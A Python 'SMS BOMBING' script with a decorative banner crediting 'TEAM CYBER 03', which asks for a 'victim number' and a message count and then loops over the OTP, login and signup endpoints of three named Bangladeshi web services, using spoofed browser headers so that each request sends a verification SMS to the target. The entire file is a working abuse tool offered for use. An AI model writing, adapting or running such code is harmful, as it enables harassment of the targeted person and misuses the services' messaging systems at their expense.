import requests,os
os.system("clear")
zahin="""
   \033[1;33m✧☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
   ☆ \033[1;34mᴡᴇʟᴄᴏᴍᴇ & ᴇɴᴊᴏʏ ᴛʜɪꜱ ᴛᴏᴏʟ \033[1;32m☆ 
   ☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
_______ _______  _______ 
(  ____ \(  ___  )(       )
| (    \/| (   ) || () () |
| (_____ | (___) || || || |
(_____  )|  ___  || |(_)| |
      ) || (   ) || |   | |
/\____) || )   ( || )   ( |
\_______)|/     \||/     \|
                           
\033[1;35m║        \033[1;36m ☞TEAM CYBER 03 ☜ \033[1;35m         ║\033[1;35m
\033[1;35m╠═════════════════════════════════╣
\033[1;35m║\033[1;33m  ADMIN    :   MR᭄﹅SAM VRIUS﹅ 𓆩ˣ‿ᵒ𓆪⁣       \033[1;35m
\033[1;35m║ \033[1;32m TOOLS    :   SMS BOMBING       \033[1;35m
\033[1;35m║ \033[1;34m GITHUB   :    GreyHat3671         \033[1;35m
\033[1;35m╚═════════════════════════════════╝
╔═════════════════════════════════╗
║    \033[1;37m  THANKS TO SAM CHOWDHURY   \033[1;37m    \033[1;35m║\033[1;35m
╚═════════════════════════════════╝
"""
print(zahin)
os.system("xdg-open https://www.facebook.com/samvrius")
nmbr=input("\033[1;31mENTER VICTIM NUMBER : +880")
total=int(input("\033[1;33m ENTER SMS AMMOUNT  : "))
print("""\033[1;32m\n\nWAIT FEW SECOND AND SEE
↘""")
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+nmbr+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+nmbr
data={
  "name": nmbr,
  "phoneNumber": nmbr,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
count=0
while total>count:
  send1=requests.get(url1,headers=headers1)
  if send1.status_code==200:
    count+=1
    print(f"{count} SMS SENT √")
  else:
    pass
  send2=requests.get(url2,headers=headers2)
  if send2.status_code==200:
    count+=1
    print(f"{count} SMS SENT SUCCESSFULLY 𓆩ˣ‿ᵒ𓆪⁣")
  else:
    pass
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    count+=1
    print(f"{count} SUCCESSFULLY SENT SAM 𓆩ˣ‿ᵒ𓆪⁣")
    
  else:
    pass
print("""\033[1;35m
………………………………………………………………………………………………
  \033[1;36m  ʕ•ᴥ•ʔ ALL SMS SENT DONE ʕ•ᴥ•ʔ\033[1;35m  
………………………………………………………………………………………………
""")